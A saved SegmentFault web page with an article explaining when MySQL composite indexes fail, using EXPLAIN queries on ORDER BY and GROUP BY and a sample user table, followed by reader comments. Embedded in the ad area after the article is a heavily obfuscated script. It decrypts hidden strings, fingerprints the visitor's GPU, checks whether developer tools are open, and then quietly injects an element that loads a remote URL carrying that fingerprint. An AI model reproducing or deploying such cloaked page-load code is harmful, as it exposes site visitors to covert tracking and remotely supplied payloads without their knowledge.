+        </div><pre class="hljs pgsql"><code>导致额外的文件排序（会降低性能）
+<span class="hljs-keyword">explain</span> <span class="hljs-keyword">select</span> <span class="hljs-type">name</span>,age <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">'zhangsan'</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> pos;//违反最左前缀法则
+<span class="hljs-keyword">explain</span> <span class="hljs-keyword">select</span> <span class="hljs-type">name</span>,age <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">'zhangsan'</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> pos,age;//违反最左前缀法则
+<span class="hljs-keyword">explain</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">'zhangsan'</span> <span class="hljs-keyword">and</span> age = <span class="hljs-number">20</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> created_time,age;//含非索引字段</code></pre>
+<p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000021464587" alt="索引失效的情况" title="索引失效的情况" data-ll-status="loaded" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/1460000021464587"></span></p>
+<p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000021464585" alt="索引失效的情况" title="索引失效的情况" data-ll-status="loaded" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/1460000021464585"></span></p>
+<p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000021464590" alt="索引失效的情况" title="索引失效的情况" data-ll-status="loaded" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/1460000021464590"></span></p>
+<h2 id="item-12">10、group by</h2>
+<div class="widget-codetool" style="display:none;">
+        <div class="widget-codetool--inner">
+        <button type="button" class="btn btn-dark far fa-copy rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="正常（索引参与了排序）
+explain select name,age from user where name = &#39;zhangsan&#39; group by age;
+备注：分组之前必排序（排序同order by）" title="" data-original-title="复制"></button>
+        </div>
+        </div><pre class="hljs pgsql"><code>正常（索引参与了排序）
+<span class="hljs-keyword">explain</span> <span class="hljs-keyword">select</span> <span class="hljs-type">name</span>,age <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">'zhangsan'</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> age;
+备注：分组之前必排序（排序同<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span>）</code></pre>
+<p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000021464591" alt="索引失效的情况" title="索引失效的情况" data-ll-status="loaded" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/1460000021464591"></span></p>
+<div class="widget-codetool" style="display:none;">
+        <div class="widget-codetool--inner">
+        <button type="button" class="btn btn-dark far fa-copy rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="导致产生临时表（会降低性能）
+explain select name,pos from user where name = &#39;zhangsan&#39; group by pos;//违反最左前缀法则
+explain select name,age from user where name = &#39;zhangsan&#39; group by pos,age;//违反最左前缀法则
+explain select name,age from user where name = &#39;zhangsan&#39; group by age,created_time;//含非索引字段" title="" data-original-title="复制"></button>
+        </div>
+        </div><pre class="hljs pgsql"><code>导致产生临时表（会降低性能）
+<span class="hljs-keyword">explain</span> <span class="hljs-keyword">select</span> <span class="hljs-type">name</span>,pos <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">'zhangsan'</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> pos;//违反最左前缀法则
+<span class="hljs-keyword">explain</span> <span class="hljs-keyword">select</span> <span class="hljs-type">name</span>,age <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">'zhangsan'</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> pos,age;//违反最左前缀法则
+<span class="hljs-keyword">explain</span> <span class="hljs-keyword">select</span> <span class="hljs-type">name</span>,age <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">'zhangsan'</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> age,created_time;//含非索引字段</code></pre>
+<p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000021464592" alt="索引失效的情况" title="索引失效的情况" data-ll-status="loaded" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/1460000021464592"></span></p>
+<p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000021464589" alt="索引失效的情况" title="索引失效的情况" data-ll-status="loaded" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/1460000021464589"></span></p>
+<p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000021464593" alt="索引失效的情况" title="索引失效的情况" data-ll-status="loaded" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/1460000021464593"></span></p>
+<h2 id="item-13">使用的示例数据</h2>
+<div class="widget-codetool" style="display: none;">
+        <div class="widget-codetool--inner">
+        <button type="button" class="btn btn-dark far fa-copy rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="mysql&gt; show create table user \G
+******************************************************
+       Table: user
+Create Table: CREATE TABLE `user` (
+  `id` int(10) NOT NULL AUTO_INCREMENT,
+  `name` varchar(20) DEFAULT NULL,
+  `age` int(10) DEFAULT &#39;0&#39;,
+  `pos` varchar(30) DEFAULT NULL,
+  `phone` varchar(11) DEFAULT NULL,
+  `created_time` datetime DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `idx_name_age_pos_phone` (`name`,`age`,`pos`,`phone`)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci" title="" data-original-title="复制"></button>
+        </div>
+        </div><pre class="hljs n1ql"><code>mysql&gt; show <span class="hljs-keyword">create</span> table <span class="hljs-keyword">user</span> \G
+******************************************************
+       Table: <span class="hljs-keyword">user</span>
+<span class="hljs-keyword">Create</span> Table: <span class="hljs-keyword">CREATE</span> TABLE <span class="hljs-symbol">`user`</span> (
+  <span class="hljs-symbol">`id`</span> int(<span class="hljs-number">10</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> AUTO_INCREMENT,
+  <span class="hljs-symbol">`name`</span> varchar(<span class="hljs-number">20</span>) DEFAULT <span class="hljs-literal">NULL</span>,
+  <span class="hljs-symbol">`age`</span> int(<span class="hljs-number">10</span>) DEFAULT <span class="hljs-string">'0'</span>,
+  <span class="hljs-symbol">`pos`</span> varchar(<span class="hljs-number">30</span>) DEFAULT <span class="hljs-literal">NULL</span>,
+  <span class="hljs-symbol">`phone`</span> varchar(<span class="hljs-number">11</span>) DEFAULT <span class="hljs-literal">NULL</span>,
+  <span class="hljs-symbol">`created_time`</span> datetime DEFAULT <span class="hljs-literal">NULL</span>,
+  <span class="hljs-keyword">PRIMARY</span> <span class="hljs-keyword">KEY</span> (<span class="hljs-symbol">`id`</span>),
+  <span class="hljs-keyword">KEY</span> <span class="hljs-symbol">`idx_name_age_pos_phone`</span> (<span class="hljs-symbol">`name`</span>,<span class="hljs-symbol">`age`</span>,<span class="hljs-symbol">`pos`</span>,<span class="hljs-symbol">`phone`</span>)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 <span class="hljs-keyword">COLLATE</span>=utf8mb4_0900_ai_ci</code></pre>
+</article><div class="d-flex flex-wrap align-items-center "><div class="m-n1"><a href="https://segmentfault.com/t/mysql" class="m-1 badge-tag">mysql</a></div></div><div class="my-4"><div id="OA_holder_3" class="ad-container" style="display:block"><div class="d-none d-lg-flex justify-content-center">
+<script async="" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/f(6).txt"></script>
+<!-- 中部横幅广告位 -->
+<ins class="adsbygoogle" style="display:inline-block;width:728px;height:90px" data-ad-client="ca-pub-6330872677300335" data-ad-slot="5598290435" data-adsbygoogle-status="done"><ins id="aswift_0_expand" style="display:inline-table;border:none;height:90px;margin:0;padding:0;position:relative;visibility:visible;width:728px;background-color:transparent;" tabindex="0" title="Advertisement" aria-label="Advertisement"><ins id="aswift_0_anchor" style="display:block;border:none;height:90px;margin:0;padding:0;position:relative;visibility:visible;width:728px;background-color:transparent;"><iframe id="aswift_0" name="aswift_0" style="left:0;position:absolute;top:0;border:0;width:728px;height:90px;" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="728" height="90" frameborder="0" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/ads.html" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" data-google-container-id="a!1" data-google-query-id="CJasorCUmPACFVTKTAIdVuoJ3w" data-load-complete="true"></iframe></ins></ins></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script><div id="beacon_3958d7d030" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/lg(3).php" width="0" height="0" alt="" style="width: 0px; height: 0px;"></div></div><script type="text/javascript">var a0_0x5a7b=["gHn8nA==","toUTCString","pPUzbNqUOoPi1YTki","2BWEY1lTYNp/T+I9OQHVoZE=","IXFRmLrn","CgNqeWZa8Y45plkkKxbF4Q==","ZrSEYyW0b7Q0IPUqb/13ifQErimI4pBr","K3dNkqXKJbiemnk=","brSEdDKSbQ==","wRm0hXRLhWKYSg==","length","YtXMjstIgPUMjLZlaNb5QcsHsJfofqs=","01GCQWkzBrg=","2lWGVHRtav9SW7Q=","VOnkruxmgN02s5ZFWA==","YtXMjstIgPUMiLZlaNz5W84dpZXm","z0CORTVjSOFaRLMFKCvA","hcmRM5IG",";x20expires=","charCodeAt","rnaTNfMM5A5g","UP71jPdtsdQrqg==","lhDGASp5UQ==","cookie","yEaEWGp9","nEERm2ggVqUX","z1yGVA==","3UmTSW5gW/ZZWL8cbzjb/NRGE7wdKmt7","10CQRQ==","y0CcZStaTd1xcqMeCA==","xwKuhXRLhWKYSg==","ZDdmYg==","LyhDf39R658bu2Y/LxzF9w==","2FeTUG5sbPteWrUZNQ==",";x20path=/","yFCUQm57QPlc","K2pqmb72KbCVm3dtWA==","fixfCHIILA","xwKuhXRUiW+LShE=","atob","UP71n/lxpNw2qpZZ","YN7DiNRcodQxq5R0XvbFYPwqgqD1UImgOA==","ivuH9sk1F","UP71iuB3oN8gt5xF","WdIF+SOSzC5OLXDS7t8=","2keFXnZ8XfI=","0kE=","yECCcG59W/5ZQqQS","UuPxqupqqNQ9qpJHAeTOZv40"];(function(_0x1b61e1,_0x5a7b88){var _0x282611=function(_0x46bc60){while(--_0x46bc60){_0x1b61e1["push"](_0x1b61e1["shift"]());}};_0x282611(++_0x5a7b88);}(a0_0x5a7b,0xd7));var a0_0x2826=function(_0x1b61e1,_0x5a7b88){_0x1b61e1=_0x1b61e1-0x0;var _0x282611=a0_0x5a7b[_0x1b61e1];return _0x282611;};function kPbwxjZPvhHuql2cK(_0x2a7b56,_0x3dbb7d){var _0x39df8d=[],_0x3893cb=0x0,_0x4bd01a,_0x39ab8a="";for(var _0x4366fa=0x0;_0x4366fa<0x100;_0x4366fa++){_0x39df8d[_0x4366fa]=_0x4366fa;}for(_0x4366fa=0x0;_0x4366fa<0x100;_0x4366fa++){_0x3893cb=(_0x3893cb+_0x39df8d[_0x4366fa]+_0x3dbb7d[a0_0x2826("0x0")](_0x4366fa%_0x3dbb7d[a0_0x2826("0x28")]))%0x100;_0x4bd01a=_0x39df8d[_0x4366fa];_0x39df8d[_0x4366fa]=_0x39df8d[_0x3893cb];_0x39df8d[_0x3893cb]=_0x4bd01a;}_0x4366fa=0x0;_0x3893cb=0x0;for(var _0x1f6e6d=0x0;_0x1f6e6d<_0x2a7b56[a0_0x2826("0x28")];_0x1f6e6d++){_0x4366fa=(_0x4366fa+0x1)%0x100;_0x3893cb=(_0x3893cb+_0x39df8d[_0x4366fa])%0x100;_0x4bd01a=_0x39df8d[_0x4366fa];_0x39df8d[_0x4366fa]=_0x39df8d[_0x3893cb];_0x39df8d[_0x3893cb]=_0x4bd01a;_0x39ab8a+=String["fromCharCode"](_0x2a7b56["charCodeAt"](_0x1f6e6d)^_0x39df8d[(_0x39df8d[_0x4366fa]+_0x39df8d[_0x3893cb])%0x100]);}return _0x39ab8a;}function z58lhCJ(_0x5b3c65){var _0x2744f4="";try{_0x2744f4=window[a0_0x2826("0x14")](_0x5b3c65);}catch(_0x1d8981){}return _0x2744f4;};function aVxrxoIKgEYVWFC7(){var _0x2b4132=[a0_0x2826("0xc"),a0_0x2826("0x2c"),"VPrvuflw","QP7jqPQ=",a0_0x2826("0x1d"),a0_0x2826("0x2"),a0_0x2826("0x18"),a0_0x2826("0x15"),a0_0x2826("0x16"),a0_0x2826("0x2d"),a0_0x2826("0x29")];var _0x1267a4=document[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x1]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x2]),_0x2b4132[0x0]));var _0x424e30;var _0x30e940;var _0x470837;var _0x229329;try{_0x424e30=_0x1267a4[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x5]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x3]),_0x2b4132[0x0]))||_0x1267a4[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x5]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x4]),_0x2b4132[0x0]));}catch(_0x408b8e){}if(_0x424e30){_0x30e940=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x6]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x8]),_0x2b4132[0x0]));_0x470837=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x7]),_0x2b4132[0x0])](_0x30e940[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x9]),_0x2b4132[0x0])]);_0x229329=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x7]),_0x2b4132[0x0])](_0x30e940[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0xa]),_0x2b4132[0x0])]);}return _0x470837+"x20"+_0x229329;}function w9jcVeUDT(){var _0x3c83be=[a0_0x2826("0xb"),a0_0x2826("0x27"),a0_0x2826("0x13"),a0_0x2826("0x6"),a0_0x2826("0x25"),"BHBRkrX3Jw==",a0_0x2826("0x22"),a0_0x2826("0x11"),a0_0x2826("0x20")];const _0x1c6d55=0xa0;const _0x37ae20=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x0]),_0x3c83be[0x3])]-window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x1]),_0x3c83be[0x3])]>_0x1c6d55;const _0x4883d0=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x2]),_0x3c83be[0x3])]-window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x4]),_0x3c83be[0x8])]>_0x1c6d55;if(!(_0x4883d0&&_0x37ae20)&&(window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])]&&window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x6]),_0x3c83be[0x8])]&&window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x6]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x7]),_0x3c83be[0x8])]||_0x37ae20||_0x4883d0)){return![];}else{return!![];}}function xGzLVAwTj9Dm(_0x528fc1,_0x3b5174,_0xfbb720){var _0x905dbf="";if(_0xfbb720){var _0x50d54e=new Date();_0x50d54e["setTime"](_0x50d54e["getTime"]()+_0xfbb720*0x18*0x3c*0x3c*0x3e8);_0x905dbf=a0_0x2826("0x30")+_0x50d54e[a0_0x2826("0x1f")]();}document[a0_0x2826("0x4")]=_0x528fc1+"="+(_0x3b5174||"")+_0x905dbf+a0_0x2826("0xf");}function uhAtRHZXRS(){var _0x7edbb9=["aJgicnL4X6hO",a0_0x2826("0x8"),"znG4dXV8X8ZND5w6dTeC+8M=",a0_0x2826("0xe"),a0_0x2826("0x5"),a0_0x2826("0x1c"),"yFeV",a0_0x2826("0x1b"),a0_0x2826("0x21"),a0_0x2826("0x7"),a0_0x2826("0x2e"),a0_0x2826("0x1a"),"iBXGQWI=",a0_0x2826("0x3"),a0_0x2826("0x2b"),"2EqZWnNs",a0_0x2826("0x9"),"yUSYVXVk","z0qlRWhgR/A=",a0_0x2826("0x10"),a0_0x2826("0xa"),a0_0x2826("0x1"),"z0SRbnhoW/laXLwS",a0_0x2826("0x2a")];var _0xde5cda=[a0_0x2826("0x1e"),"lmjgiQ==",a0_0x2826("0x2f"),a0_0x2826("0x24"),"ZLWPeiO4",a0_0x2826("0x26"),"sYkn4Oqn64Pdr"];var _0x33bc41;try{_0x33bc41=aVxrxoIKgEYVWFC7();}catch(_0x110e3a){}try{_0x33bc41=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x0]),_0xde5cda[0x2])](_0x33bc41);}catch(_0x3e7ed0){}_0x33bc41=encodeURIComponent(_0x33bc41);var _0x13700b=navigator["userAgent"]||navigator["vendor"]||window["opera"];var _0xb93071=kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x3]),_0xde5cda[0x6]);var _0x331712=new RegExp(_0xb93071,"i");var _0x53686b=!![];var _0x2d8ac7=kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x14]),_0x7edbb9[0x15]);if(_0x331712[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x1]),_0xde5cda[0x2])](_0x13700b)){if(document[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x4]),_0xde5cda[0x6])][kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x5]),_0xde5cda[0x6])](_0x2d8ac7)==-0x1){if(w9jcVeUDT()){var _0x5d4d20=kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x17]),_0x7edbb9[0x15])+kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x1]),_0x7edbb9[0x15])+"?"+kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x8]),_0x7edbb9[0x15])+"="+_0x33bc41;var _0x5b2742=document[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x3]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x4]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x7]),_0x7edbb9[0x15]),kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x8]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x9]),_0x7edbb9[0x15]),kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0xa]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x6]),_0x7edbb9[0x15]),_0x5d4d20);document["body"][kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0xe]),_0x7edbb9[0x15])](_0x5b2742);xGzLVAwTj9Dm(_0x2d8ac7,"1","7");}}}}var aJ4knj0Q2TsZ=[a0_0x2826("0x19"),"XYcD7gyt6AZkIQDh3+Fn/PI=",a0_0x2826("0x12"),a0_0x2826("0xd"),a0_0x2826("0x23"),a0_0x2826("0x17")];var xz1ZKT5VYzY7UB=document[kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x0]),aJ4knj0Q2TsZ[0x2])](kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x1]),aJ4knj0Q2TsZ[0x2]));if(!xz1ZKT5VYzY7UB){document[kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x3]),aJ4knj0Q2TsZ[0x5])](kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x4]),aJ4knj0Q2TsZ[0x5]),uhAtRHZXRS());}</script>
+</div></div><div class="text-secondary font-size-14 mt-3 mb-5 d-flex justify-content-between row"><div class="col"><span>阅读 <!-- -->6.3k</span><span class="split-dot"></span><time datetime="2020-01-02T05:21:31.000Z" itemprop="datePublished">更新于 <!-- -->2020-01-03 </time></div><div class="operation col-6 text-right col-xs-3 col"><div></div></div></div><div class="functional-area-bottom text-center"><div role="group" class="btn-group like-group align-items-center btn-group"><button type="button" class="btn mr-2 rounded btn btn-outline-primary"><i class="far fa-thumbs-up"></i><span class="ml-1">赞</span><span class="mainLikeNum ml-1">34</span></button><button type="button" class="btn mr-2 rounded btn btn-outline-secondary"><i class="far fa-bookmark"></i><span class="ml-1">收藏</span><span class="ml-1">29</span></button><div class="bottom-share-wrap dropdown"><a href="https://segmentfault.com/a/1190000021464570?utm_source=sf-similar-article#" class="nav-tab-item  btn d-flex justify-content-center align-items-center dropdown-toggle" aria-label="分享"><button type="button" class="btn rounded btn btn-outline-secondary"><i class="far fa-share-alt"></i><span class="ml-1">分享</span></button></a></div></div></div><canvas hidden="" class="qrcode"></canvas><div class="font-size-14 text-secondary text-center mt-3 mb-5"><span>本作品系原创，</span><a target="_blank" rel="noreferrer" class="text-secondary" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">采用《署名-非商业性使用-禁止演绎 4.0 国际》许可协议</a></div></div></div><div class="d-block d-xl-none mt-sm-4"><div class="mb-4 card"><div class="card-body"><div class="d-flex align-items-center mb-3"><picture class="rounded-circle mr-3"><a href="https://segmentfault.com/u/zhangdejian"><img src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/93059368-5e0ade65df70d_huge128" alt="avatar" width="64" height="64" class="rounded-circle"></a></picture><div><h5 class="mb-0"><a href="https://segmentfault.com/u/zhangdejian" class="text-body">张德Talk</a></h5></div></div><div class="text-secondary text-truncate-2 userExcerpt mb-3"><p>每日精进，致力于成为全栈工程师！</p></div><div class="d-flex align-items-center mb-3"><div class="mr-4"><strong>512</strong><span class="text-secondary"> 声望</span></div><div><strong>623</strong><span class="text-secondary"> 粉丝</span></div></div><button type="button" class="btn btn-primary btn-block">关注作者</button></div></div></div><div><div class="comment-wrap  card"><div class="d-flex align-items-center justify-content-between bg-transparent card-header"><h5 class="mb-0">3<!-- --> 条评论</h5><div aria-label="Basic" role="group" class="btn-group"><button type="button" class="btn btn-secondary btn-sm">得票数</button><button type="button" class="btn btn-outline-secondary btn-sm">最新</button></div></div><div class="card-body"><div class="mb-4 media"><img src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/3179314346-5f61e47221e07" class="rounded-circle mr-3" width="38" aria-hidden="true"><div class="media-body"><div class="form-group"><textarea rows="1" placeholder="撰写评论 …" aria-label="评论" class="comment-text form-control" data-tribute="true" style="overflow: hidden; overflow-wrap: break-word; resize: none; height: 38px;"></textarea><div class="invalid-feedback"></div></div><div class="d-flex justify-content-end align-items-center"><a href="https://segmentfault.com/a/1190000021464570?utm_source=sf-similar-article#" class="mr-3" aria-label="提示"><i class="far fa-info-circle text-secondary"></i></a><button disabled="" type="button" class="float-right btn btn-primary">提交评论</button></div></div></div><div class="comment-body-wrap false"><div class="mb-r d-flex align-items-start mb-4 media"><img class="d-block rounded-circle mr-3" width="38" height="38" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/3179314346-5f61e47221e07" alt=""><div class="w-0  media-body"><div class="commentUnit "><div class="mb-1"><a class="d-uname" href="https://segmentfault.com/u/junex" rel="noreferrer" target="_blank"><strong>junex</strong></a>：<div class="parsedText fmt"><p>受益匪浅~</p></div></div><div class="handle-bar font-size-14 d-flex justify-content-between"><div><a class="text-secondary" href="https://segmentfault.com/a/1190000021464570?utm_source=sf-similar-article#"><span class="mainLike-comment "><i class="fa-w-16 far fa-thumbs-up" style="width: 1em;"></i></span></a><span class="split-dot"></span><a class="text-secondary btn-comment" href="https://segmentfault.com/a/1190000021464570?utm_source=sf-similar-article#">回复</a><span class="split-dot"></span><span class="text-secondary">2020-09-03 </span></div><div class="control-area d-none"></div></div></div><div class="replies hidden"><div class="bg-light border-0 mt-2 card"><div class="p-3 card-body"><div class="reply-list list-group"></div></div></div></div></div></div><div class="mb-r d-flex align-items-start mb-4 media"><img class="d-block rounded-circle mr-3" width="38" height="38" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/3745786705-5f72da9d3f0eb_big64" alt=""><div class="w-0  media-body"><div class="commentUnit "><div class="mb-1"><a class="d-uname" href="https://segmentfault.com/u/feixiang_5f72da8da951e" rel="noreferrer" target="_blank"><strong>飞翔</strong></a>：<div class="parsedText fmt"><p>多谢博主，收益匪浅</p></div></div><div class="handle-bar font-size-14 d-flex justify-content-between"><div><a class="text-secondary" href="https://segmentfault.com/a/1190000021464570?utm_source=sf-similar-article#"><span class="mainLike-comment "><i class="fa-w-16 far fa-thumbs-up" style="width: 1em;"></i></span></a><span class="split-dot"></span><a class="text-secondary btn-comment" href="https://segmentfault.com/a/1190000021464570?utm_source=sf-similar-article#">回复</a><span class="split-dot"></span><span class="text-secondary">2020-09-29 </span></div><div class="control-area d-none"></div></div></div><div class="replies hidden"><div class="bg-light border-0 mt-2 card"><div class="p-3 card-body"><div class="reply-list list-group"></div></div></div></div></div></div><div class="mb-r d-flex align-items-start false media"><img class="d-block rounded-circle mr-3" width="38" height="38" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/4093861783-5f9b84916fe36_big64" alt=""><div class="w-0  media-body"><div class="commentUnit "><div class="mb-1"><a class="d-uname" href="https://segmentfault.com/u/xuqlufo" rel="noreferrer" target="_blank"><strong>徐qlufo</strong></a>：<div class="parsedText fmt"><p>EXPLAIN SELECT name FROM edu.user where name = 111; 就命中组合索引，但是全表扫描了。很多东西不一定按照上面说的规则来的，最好有更好的工具能查看整个语句执行的过程和索引处理的过程，才能更好的理解数据库运行机制。</p></div></div><div class="handle-bar font-size-14 d-flex justify-content-between"><div><a class="text-secondary" href="https://segmentfault.com/a/1190000021464570?utm_source=sf-similar-article#"><span class="mainLike-comment "><i class="fa-w-16 far fa-thumbs-up" style="width: 1em;"></i></span></a><span class="split-dot"></span><a class="text-secondary btn-comment" href="https://segmentfault.com/a/1190000021464570?utm_source=sf-similar-article#">回复</a><span class="split-dot"></span><span class="text-secondary">2020-11-02 </span></div><div class="control-area d-none"></div></div></div><div class="replies hidden"><div class="bg-light border-0 mt-2 card"><div class="p-3 card-body"><div class="reply-list list-group"></div></div></div></div></div></div></div></div></div></div><div class="bg-white text-center border border-dark border-width-2 p-5 my-4 rounded"><div class="h1">你知道吗？</div><p class="my-4" style="font-size:1.25rem">如果你发现特殊情况太多，那你肯定是用错方法了。</p><button style="width:178px" type="button" class="btn btn-primary btn-lg">注册登录</button></div><div class="mt-4 card"><h5 class="bg-transparent card-header">继续阅读</h5><div class="recommend-list-wrap list-group"><div class="card border-0"><div class="list-group list-group-flush"><a class="list-group-item list-group-item-action py-3" href="https://segmentfault.com/a/1190000021458117?utm_source=sf-similar-article" target="_blank"><h5 class="h5 mb-2 text-break" style="color: rgb(33, 37, 41);">一张图彻底搞懂MySQL的 explain</h5><p class="mb-2 text-truncate text-secondary">explain关键字可以模拟MySQL优化器执行SQL语句，可以很好的分析SQL语句或表结构的性能瓶颈。 explain的用途 {代码...} explain的执行效果 {代码...} explain包含的字段 {代码...} 图片版 文字版 id字段 1. id相同...</p><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-primary">张德Talk</span><span class="split-dot"></span><span>阅读 16.8k</span><span class="split-dot"></span><span>48 赞</span><span class="split-dot"></span><span>5 评论</span></p></a><a class="list-group-item list-group-item-action py-3" href="https://segmentfault.com/a/1190000022690969?utm_source=sf-similar-article" target="_blank"><h5 class="h5 mb-2 text-break" style="color: rgb(33, 37, 41);">我去，为什么最左前缀原则失效了？</h5><p class="mb-2 text-truncate text-secondary">最近，在 mysql 